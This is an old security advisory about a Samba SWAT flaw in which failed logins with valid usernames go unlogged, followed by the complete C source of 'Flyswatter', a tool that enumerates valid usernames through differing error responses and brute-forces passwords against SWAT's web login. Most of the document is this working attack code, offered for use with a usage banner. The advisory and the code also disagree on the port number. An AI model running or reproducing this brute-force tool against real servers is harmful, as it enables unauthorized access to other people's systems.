source: http://www.securityfocus.com/bid/1873/info

The Samba software suite is a collection of programs that implements the SMB protocol for unix systems, allowing you to serve files and printers to Windows, NT, OS/2 and DOS clients. This protocol is sometimes also referred to as the LanManager or Netbios protocol. Samba ships with a utility titled SWAT (Samba Web Administration Tool) which is used for remote administration of the Samba server and is by default set to run from inetd as root on port 701. Certain versions of this software ship with a vulnerability remote users can abuse to potentially leverage system access. 

This problem in particular is that the loging facility with certain versions of SWAT will not log bad login attempts if the remote user enters a correct username but wrong password. This in effect allows the remote user to continuously attack the service guessing passwords without being logged or locked out.

/*

	Flyswatter.

	I must say, SWAT code is pretty ghetto.
	they 'protect against crackers' by 
	sending bad auth errors if your user 
	donesnt exist oh wait oops they forgot
	to have the same message if the user does
	exist but you the wrong password. I 
	guess they kina missed the boat.

	Anyway, it works. 

	Yeah, the base64_encode() is pretty
	damn ghetto. Oh well, at least its
	readable.

	Miah rules. Thanx for the ideas on this

	-dodeca-T
	t12@uberhax0r.net

	PS: If you have ant problems, I'd
	say your best bet is to live in harmony
	with the little creatures. Remeber, 
	they just clean up after your messes.

*/

#include <stdio.h>
#include <netdb.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <signal.h>
#include <errno.h>
#include <fcntl.h>

#define SWAT_PORT 901
#define MAX_NAME_SIZE 16
#define MAX_PASS_SIZE 16
#define CHECK_PASSWORD "centerfield"
#define USER_AGENT "super-hyper-alpha-pickle-2000"

struct VALID_NAMES  {
					 char *name;
					 struct VALID_NAMES *next;
					};

struct VALID_NAMES *add_to_names(struct VALID_NAMES *list, char *name)
{
 list->name=(char *)malloc(MAX_NAME_SIZE);   
 memcpy(list->name, name, MAX_NAME_SIZE);
 list->next=(struct VALID_NAMES *)malloc(sizeof(struct VALID_NAMES));
 list=list->next;
 memset(list, 0, sizeof(struct VALID_NAMES));
 return(list);
}

void chop(char *str)
{
 int x;
 
 for(x=0;str[x]!='\0';x++)
	 if(str[x]=='\n')
		{
		 str[x]='\0';
		 return;
		}
 return;
}
		
char *base64_encode(char *str)
{
 char *b64="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=";

 int x, y;
 unsigned char *output;

 output=(char *)malloc(strlen(str)*2);
 memset(output, 0, strlen(str)*2);

 for(x=0, y=0;x<strlen(str)-(strlen(str)%3) ;x+=3, y+=4)
	{
 	 output[y] = str[x] >> 2; 

	 output[y+1] = str[x] << 6;
 	 output[y+1] = output[y+1] >> 2;
     output[y+1] = output[y+1] | (str[x+1] >> 4);

	 output[y+2] = str[x+1] << 4; 
	 output[y+2] = output[y+2] >> 2; 
	 output[y+2] = output[y+2] | (str[x+2] >> 6);

	 output[y+3] = str[x+2] << 2;
	 output[y+3] = output[y+3] >> 2;
	}

 if(strlen(str)%3 == 1)
	{
	 output[y]=str[x] >> 2;
	 output[y+1]=str[x] << 6;
	 output[y+1]=output[y+1] >> 2;
	 output[y+2]=64;
	 output[y+3]=64;
	}

 if(strlen(str)%3 == 2)
	{
	 output[y]=str[x] >> 2;
	 output[y+1]=str[x] << 6;
	 output[y+1]=output[y+1] >> 2;
	 output[y+1]=output[y+1] | (str[x+1] >> 4);
	 output[y+2]=str[x+1] << 4;
	 output[y+2]=output[y+2] >> 2;
	 output[y+3]=64;
	}

 for(x=0 ; output[x] != 0 ; x++)
	 output[x] = b64[output[x]]; 

 output[x+1]='\0';
 return(output);
}

int check_user(char *name, char *pass, struct hostent *he)
{
 char buf[8192]="";
 char buf2[1024]="";
 int s;
 struct sockaddr_in s_addr;

 memset(buf, 0, sizeof(buf));
 memset(buf2, 0, sizeof(buf2));

 s_addr.sin_family = PF_INET;
 s_addr.sin_port = htons(SWAT_PORT);
 memcpy((char *) &s_addr.sin_addr, (char *) he->h_addr,
        sizeof(s_addr.sin_addr));

 if((s=socket(PF_INET, SOCK_STREAM, IPPROTO_TCP)) == -1)
    {
     fprintf(stderr, "cannot create socket\n");
     exit(-1);
    }

 if(connect(s, (struct sockaddr *) &s_addr, sizeof(s_addr))==-1)
    {
     fprintf(stderr, "cannot connect\n");
     exit(-1);
    }

 chop(name);
 chop(pass);
 sprintf(buf2, "%s:%s", name, pass);
 sprintf(buf, "GET / HTTP/1.0\n"
              "Connection: Keep-Alive\n"
              "User-Agent: %s\n"
              "Authorization: Basic %s\n\n", USER_AGENT, base64_encode(buf2));

 if(send(s, buf, strlen(buf), 0) < 1)
    {
     perror("send: ");
     exit(1);
    }

 memset(buf, 0, sizeof(buf));
 if(recv(s, buf, sizeof(buf), 0) < 1)
    {
     perror("recv: ");
     exit(1);
    }

 buf[sizeof(buf)]='\0';

 if(strstr(buf, "HTTP/1.0 401 Authorization Required") != NULL)
    {
	 close(s);
     return 1;
    }
 else if(strstr(buf, "HTTP/1.0 401 Bad Authorization") != NULL)
    {
	 close(s);
     return 0;
    }
 else if(strstr(buf, "HTTP/1.0 200 OK") != NULL)
	{
	 close(s);
	 return 2;
	}
 else
    {
     printf("Unknown result: %s\n", buf);
     exit(1);
    }
}

void usage(void)
{
 printf("\nUsage: flyswatter [-a] -t <target> -n <namefile> -p <passwordfile>\n");
 printf("\n\t-a: Do not verify that users exist.\n");
 exit(1);
}

int main(int argc, char** argv)
{
 int x, y, z;

 int s;
 char buf[MAX_NAME_SIZE]="";
 FILE *pfile, *nfile;
 struct hostent *he;
 struct VALID_NAMES *valid_names;
 struct VALID_NAMES *list_walk;
 
 int tryall=0;
 char target[1024]="";
 char namefile[512]="";
 char passwordfile[512]="";

 valid_names=(struct VALID_NAMES *)malloc(sizeof(struct VALID_NAMES));
 list_walk=valid_names;
 memset(valid_names, 0, sizeof(struct VALID_NAMES));
 
 if(argc<2)
	 usage();

 for(x=1;x<argc;x++)
	{
	 if(argv[x][0]=='-')
		 for(y=1;y<strlen(argv[x]);y++) 
			 switch(argv[x][y])
				{
				 case 'a':
					tryall=1;
					break;
				 case 'h':
					usage();
					break;
				 case 't':
					if(x+1<argc)
				 		strncpy(target, argv[x+1], sizeof(target));
					else
						{
						 fprintf(stderr, "Must Specify target\n");
						 exit(1);
						}
				 	break;
			 	 case 'n':
					if(x+1<argc)
						strncpy(namefile, argv[x+1], sizeof(namefile));
					else
						{
						 fprintf(stderr, "Must Specify namefile\n");
						 exit(1);
						}
					break;
				 case 'p':
					if(x+1<argc)
						strncpy(passwordfile, argv[x+1], sizeof(passwordfile));
					else
						{
						 fprintf(stderr, "Must Specify passwordfile\n");
						 exit(1);
						}
					break;
				 default:
					fprintf(stderr, "Invalid option\n");
					exit(1);
					break;
				}	
	}

 if(strncmp(target, "", sizeof(target))==0)
	{
	 fprintf(stderr, "Must specify target\n");
	 exit(1);
	}

 if(strncmp(namefile, "", sizeof(target))==0)
	{
	 fprintf(stderr, "Must specify namefile\n");
	 exit(1);
	}

 if((nfile=fopen(namefile, "r"))==NULL)
	{
	 fprintf(stderr, "Cannot open %s\n", namefile);
	 exit(1);
	}

 if(strcmp(passwordfile, "")!=0)
	if((pfile=fopen(passwordfile, "r"))==NULL)
	{
	 fprintf(stderr, "Cannot open %s\n", passwordfile);
	 exit(1);
	} 

 printf("\n");
 if(tryall==1)
	printf("-Not verifying usenames\n");
 printf("-Namefile: %s\n", namefile);
 printf("-Passwordfile: %s\n", passwordfile);
 printf("-Target: %s\n", target);

 if((he=gethostbyname(target)) == NULL)
    {
     fprintf(stderr, "\t*Invalid target\n");
     usage();
    }
 
 if(tryall==0)
	 while(fgets(buf, sizeof(buf), nfile))
		{
	 	 chop(buf);
	 	 if(check_user(buf, CHECK_PASSWORD, he) == 1)
			{
				printf("User \"%s\" exists!\n", buf);
				list_walk=add_to_names(list_walk, buf);
			}
	 	}
 else
	 while(fgets(buf, sizeof(buf), nfile))
		{
		 chop(buf);
		 list_walk=add_to_names(list_walk, buf);
		}

 if(strcmp(passwordfile, "")==0)
	{
	 exit(0);
	 printf("Finished.\n");
	}

 while(valid_names->next != 0)
	{
	 fseek(pfile, 0, SEEK_SET);
	 while(fgets(buf, sizeof(buf), pfile)!=NULL)
		{
		 if(check_user(valid_names->name, buf, he)==2)
			printf("valid username/password: %s:%s\n", 
				   valid_names->name, buf);
		}
	 valid_names=valid_names->next; 
	}

 printf("Finished.\n");
 exit(0);
}